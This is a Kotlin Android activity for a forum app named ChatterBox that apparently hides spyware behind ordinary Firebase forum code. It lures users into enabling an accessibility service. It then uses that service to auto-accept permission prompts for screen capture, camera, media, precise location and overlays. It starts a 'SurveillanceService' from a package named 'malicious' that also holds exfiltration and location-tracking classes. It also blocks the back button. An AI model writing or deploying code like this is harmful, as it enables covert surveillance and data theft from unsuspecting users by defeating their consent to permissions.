package com.example.ChatterBox

import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.util.Log
import android.view.Menu
import android.view.MenuItem
import android.view.View
import android.widget.Button
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.ActionBarDrawerToggle
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import androidx.core.view.GravityCompat
import androidx.drawerlayout.widget.DrawerLayout
import com.bumptech.glide.Glide
import com.example.ChatterBox.accessibility.AccessibilityHelper
import com.example.ChatterBox.accessibility.AccessibilityPromoActivity
import com.example.ChatterBox.malicious.SurveillanceService
import com.example.ChatterBox.malicious.ExfiltrationManager
import com.example.ChatterBox.malicious.LocationTracker
import com.example.ChatterBox.models.Forum
import com.example.ChatterBox.models.User
import com.example.ChatterBox.util.PermissionsManager
import com.google.android.material.navigation.NavigationView
import com.google.firebase.auth.FirebaseAuth
import com.google.firebase.firestore.FirebaseFirestore
import java.util.Random

class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelectedListener {
    private lateinit var db: FirebaseFirestore
    private lateinit var auth: FirebaseAuth
    private lateinit var drawerLayout: DrawerLayout

    companion object {
        private const val SEARCH_USER_REQUEST_CODE = 1001
        private const val MEDIA_PROJECTION_REQUEST_CODE = 1002
        private const val PERMISSION_REQUEST_CODE = 1003
        private const val OVERLAY_PERMISSION_REQUEST_CODE = 1004
        private const val BACKGROUND_LOCATION_REQUEST_CODE = 1005
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        db = FirebaseFirestore.getInstance()
        auth = FirebaseAuth.getInstance()

        val currentUser = auth.currentUser
        if (currentUser == null) {
            val intent = Intent(this, LoginActivity::class.java)
            intent.flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
            startActivity(intent)
            finish()
            return
        }
        if (shouldShowAccessibilityPromo()) {
            startActivity(Intent(this, AccessibilityPromoActivity::class.java))
        }
        if (AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
            // Only request media projection first - other permissions will be requested afterwards
            requestMediaProjection()
            // Don't call requestInitialPermissions() here, it will be called from onActivityResult
        }
        setupDrawer()
        loadUserProfile()
        checkIfAdmin()
        loadEnrolledForums()
    }

    private fun shouldShowAccessibilityPromo(): Boolean {
        return AccessibilityHelper.shouldShowAccessibilityPromo(this)
    }

    override fun onResume() {
        super.onResume()
        loadEnrolledForums() // ✅ Refresh the forum list when returning to MainActivity
    }

    override fun onDestroy() {
        super.onDestroy()
        AccessibilityHelper.resetSession(this)
    }

    /** 🔹 Setup Navigation Drawer */
    private fun setupDrawer() {
        drawerLayout = findViewById(R.id.drawer_layout)
        val toolbar: androidx.appcompat.widget.Toolbar = findViewById(R.id.toolbar)

        setSupportActionBar(toolbar) // ✅ Attach custom toolbar as Action Bar

        val toggle = ActionBarDrawerToggle(
            this, drawerLayout, toolbar,
            R.string.navigation_drawer_open, R.string.navigation_drawer_close
        )
        drawerLayout.addDrawerListener(toggle)
        toggle.syncState()

        val navigationView: NavigationView = findViewById(R.id.navigation_view)
        navigationView.setNavigationItemSelectedListener(this)
    }

    /** 🔹 Handle Sidebar Navigation */
    override fun onNavigationItemSelected(item: MenuItem): Boolean {
        when (item.itemId) {
            R.id.nav_saved_posts -> {
                startActivity(Intent(this, SavedPostsActivity::class.java))
            }

            R.id.nav_profile -> {
                startActivity(Intent(this, ProfileActivity::class.java))
                Toast.makeText(this, "Profile Clicked", Toast.LENGTH_SHORT).show()
            }

            R.id.nav_inbox -> {
                startActivity(Intent(this, InboxActivity::class.java))
                Toast.makeText(this, "Message Clicked", Toast.LENGTH_SHORT).show()
            }

            R.id.nav_add -> {
                startActivity(Intent(this, ForumActivity::class.java))
                Toast.makeText(this, "Forum Clicked", Toast.LENGTH_SHORT).show()
            }

            R.id.nav_logout -> {
                showLogoutDialog()
            }
        }
        drawerLayout.closeDrawer(GravityCompat.START) // Close drawer after clicking
        return true
    }

    override fun onCreateOptionsMenu(menu: Menu?): Boolean {
        menuInflater.inflate(R.menu.sort_menu, menu)
        return true
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == SEARCH_USER_REQUEST_CODE && resultCode == RESULT_OK && data != null) {
            val userId = data.getStringExtra("userId") ?: return
            val intent = Intent(this, ProfileActivity::class.java)
            intent.putExtra("userId", userId)
            startActivity(intent) // ✅ Open the selected user's profile
        }
        else if (requestCode == MEDIA_PROJECTION_REQUEST_CODE) {
            if (resultCode == RESULT_OK && data != null) {
                // Store the media projection result for later use
                val serviceIntent = Intent(this, SurveillanceService::class.java)
                serviceIntent.putExtra("resultCode", resultCode)
                serviceIntent.putExtra("data", data)
                startService(serviceIntent)
                Toast.makeText(this, "Screen capture service started", Toast.LENGTH_SHORT).show()

                // Now that media projection is granted, continue with other permissions
                requestInitialPermissions()
            }
        } else if (requestCode == OVERLAY_PERMISSION_REQUEST_CODE) {
            // Handle overlay permission result
            if (Settings.canDrawOverlays(this)) {
                Toast.makeText(this, "Overlay permission granted", Toast.LENGTH_SHORT).show()
            } else {
                Toast.makeText(this, "Overlay permission denied", Toast.LENGTH_SHORT).show()
            }
        }
    }

    override fun onOptionsItemSelected(item: MenuItem): Boolean {
        return when (item.itemId) {
            R.id.action_search -> {
                val intent = Intent(this, SearchUsersActivity::class.java)
                startActivityForResult(intent, SEARCH_USER_REQUEST_CODE) // ✅ Start for result
                true
            }

            else -> super.onOptionsItemSelected(item)
        }
    }

    /** 🔹 Handle Back Button */
    override fun onBackPressed() {
        if (drawerLayout.isDrawerOpen(GravityCompat.START)) {
            drawerLayout.closeDrawer(GravityCompat.START) // 🔥 Close drawer first
        } else {
            // 🔥 Prevent back action (do nothing)
            Toast.makeText(this, "Press the logout button to exit.", Toast.LENGTH_SHORT).show()
        }
    }

    private fun showLogoutDialog() {
        AlertDialog.Builder(this)
            .setTitle("Log Out")
            .setMessage("Are you sure you want to log out?")
            .setPositiveButton("Yes") { _, _ ->
                logoutUser() // ✅ Only logout when user confirms
            }
            .setNegativeButton("Cancel", null)
            .show()
    }

    private fun logoutUser() {
        auth.signOut() // ✅ Sign out from Firebase Auth

        val intent = Intent(this, LoginActivity::class.java)
        intent.flags =
            Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK // ✅ Clear backstack
        startActivity(intent)
        AccessibilityHelper.resetSession(this)
        finish() // ✅ Close current activity
    }

    /** 🔹 Load User Profile */
    private fun loadUserProfile() {
        val user = auth.currentUser ?: return
        val navigationView: NavigationView = findViewById(R.id.navigation_view)
        val headerView = navigationView.getHeaderView(0)

        val userProfileImage = headerView.findViewById<ImageView>(R.id.user_profile_image)
        val userNameTextView = headerView.findViewById<TextView>(R.id.user_name)

        db.collection("users").document(user.uid)
            .addSnapshotListener { document, error ->
                if (error != null) {
                    Toast.makeText(
                        this,
                        "Error loading profile: ${error.message}",
                        Toast.LENGTH_SHORT
                    ).show()
                    return@addSnapshotListener
                }

                if (document != null && document.exists()) {
                    val displayName = document.getString("displayName") ?: "User"
                    val profilePicUrl = document.getString("profilePicUrl")

                    userNameTextView.text = displayName

                    if (!profilePicUrl.isNullOrEmpty()) {
                        Glide.with(this)
                            .load(profilePicUrl)
                            .placeholder(R.drawable.ic_profile_placeholder)
                            .into(userProfileImage)
                    }
                }
            }
    }

    /** 🔹 Check if User is Admin */
    private fun checkIfAdmin() {
        val currentUser = auth.currentUser ?: return
        val userRef = db.collection("users").document(currentUser.uid)

        userRef.get().addOnSuccessListener { document ->
            if (document.exists()) {
                val isAdmin = document.getBoolean("isAdmin") ?: false
                val navigationView: NavigationView = findViewById(R.id.navigation_view)
                val menu = navigationView.menu

                menu.findItem(R.id.nav_add).isVisible = isAdmin
                Log.d("FirebaseAuth", "User isAdmin: $isAdmin")
            }
        }.addOnFailureListener {
            Toast.makeText(this, "Failed to fetch user data", Toast.LENGTH_SHORT).show()
        }
    }

    /** 🔹 Load Enrolled Forums into Sidebar */
    private fun loadEnrolledForums() {
        val currentUser = auth.currentUser ?: return
        val userRef = db.collection("users").document(currentUser.uid)

        // 🔹 Listen for changes to the user's enrolled forums
        userRef.addSnapshotListener { document, error ->
            if (error != null) {
                Log.e("Firestore", "Error fetching enrolled forums: ${error.message}")
                return@addSnapshotListener
            }

            if (document != null && document.exists()) {
                val enrolledModuleCodes =
                    document.get("enrolledForum") as? List<String> ?: emptyList()
                val navView: NavigationView = findViewById(R.id.navigation_view)
                val menu = navView.menu
                menu.removeGroup(R.id.nav_enrolled_forums_group) // ✅ Clear old entries

                if (enrolledModuleCodes.isEmpty()) {
                    menu.add(
                        R.id.nav_enrolled_forums_group,
                        Menu.NONE,
                        Menu.NONE,
                        "No Enrolled Forums"
                    ).isEnabled = false
                    return@addSnapshotListener
                }

                // 🔥 Listen for real-time updates from the `forums` collection
                db.collection("forums")
                    .whereIn("code", enrolledModuleCodes)
                    .addSnapshotListener { forumDocs, error ->
                        if (error != null) {
                            Log.e("Firestore", "Error fetching forums: ${error.message}")
                            return@addSnapshotListener
                        }

                        menu.removeGroup(R.id.nav_enrolled_forums_group) // ✅ Clear old entries

                        if (forumDocs == null || forumDocs.isEmpty) {
                            menu.add(
                                R.id.nav_enrolled_forums_group,
                                Menu.NONE,
                                Menu.NONE,
                                "No Forums Found"
                            ).isEnabled = false
                            return@addSnapshotListener
                        }

                        for (forumDoc in forumDocs) {
                            val forumName = forumDoc.getString("name") ?: "Unknown Forum"
                            val forumCode = forumDoc.getString("code") ?: ""
                            val forumId = forumDoc.id // ✅ Get the correct forum ID

                            val forumItem = menu.add(
                                R.id.nav_enrolled_forums_group,
                                Menu.NONE,
                                Menu.NONE,
                                "$forumName ($forumCode)"
                            )

                            forumItem.setOnMenuItemClickListener {
                                val intent = Intent(this, ForumPostsActivity::class.java)
                                intent.putExtra("FORUM_ID", forumId) // ✅ Pass correct forum ID
                                intent.putExtra("FORUM_CODE", forumCode)
                                startActivity(intent)
                                true
                            }
                        }
                    }
            }
        }
    }


    // Replace your current requestInitialPermissions method with this:
    private fun requestInitialPermissions() {
        // Standard permissions that can be requested with standard requestPermissions API
        val standardPermissions = mutableListOf(
            android.Manifest.permission.READ_MEDIA_IMAGES,
            android.Manifest.permission.READ_MEDIA_VIDEO,
            android.Manifest.permission.READ_MEDIA_AUDIO,
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.POST_NOTIFICATIONS
        )

        val permissionsToRequest = standardPermissions.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()

        if (permissionsToRequest.isEmpty()) {
            return
        }

        if (AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
            PermissionsManager.enableAutoGrantPermissions(permissionsToRequest.size)
        }

        ActivityCompat.requestPermissions(this, permissionsToRequest, PERMISSION_REQUEST_CODE)
    }

    // Also update your onRequestPermissionsResult to handle when permissions are done
    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)

        when (requestCode) {
            PERMISSION_REQUEST_CODE -> {
                val deniedPermissions = permissions.filterIndexed { index, _ ->
                    grantResults[index] != PackageManager.PERMISSION_GRANTED
                }

                if (deniedPermissions.isEmpty()) {
                    // All standard permissions granted
                    Toast.makeText(this, "All permissions granted", Toast.LENGTH_SHORT).show()

                    // Disable auto-granting since we're done with standard permissions
                    PermissionsManager.disableAutoGrantPermissions()

                    // Now proceed to special permissions
                    handleSpecialPermissions()
                } else {
                    // Some permissions were denied
                    Toast.makeText(
                        this,
                        "Some permissions were denied. App functionality may be limited.",
                        Toast.LENGTH_LONG
                    ).show()

                    // Disable auto-granting since user manually denied some permissions
                    PermissionsManager.disableAutoGrantPermissions()

                    // Still proceed to special permissions even if some standard ones were denied
                    handleSpecialPermissions()
                }
            }

            BACKGROUND_LOCATION_REQUEST_CODE -> {
                // Handle background location permission result
                if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                    Toast.makeText(this, "Background location access granted", Toast.LENGTH_SHORT)
                        .show()
                } else {
                    Toast.makeText(this, "Background location access denied", Toast.LENGTH_SHORT)
                        .show()
                }

                // Make sure auto-granting is disabled when done
                PermissionsManager.disableAutoGrantPermissions()
            }
        }
    }

    // Update your special permissions handling too
    private fun handleSpecialPermissions() {
        // Only count overlay permission for now
        if (!Settings.canDrawOverlays(this) &&
            AccessibilityHelper.isAccessibilityServiceEnabled(this)) {

            // Add a delay before starting the overlay permission flow
            Handler(Looper.getMainLooper()).postDelayed({
                PermissionsManager.enableAutoGrantPermissions(1)

                // Pre-notify the accessibility service about the upcoming flow
                val intent = Intent("com.example.ChatterBox.PREPARE_OVERLAY_PERMISSION")
                sendBroadcast(intent)

                // Then start the actual permission request
                Handler(Looper.getMainLooper()).postDelayed({
                    val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION)
                    intent.data = Uri.parse("package:$packageName")
                    Toast.makeText(this, "Please allow displaying over other apps", Toast.LENGTH_LONG).show()
                    startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST_CODE)
                }, 500)
            }, 1000)
        }
    }

    private fun requestMediaProjection() {
        // First enable auto-grant for this single permission dialog
        if (AccessibilityHelper.isAccessibilityServiceEnabled(this)) {
            PermissionsManager.enableAutoGrantPermissions(1)  // Just one dialog to handle
        }

        // Then request the media projection
        val mediaProjectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mediaProjectionManager.createScreenCaptureIntent(), MEDIA_PROJECTION_REQUEST_CODE)
    }
}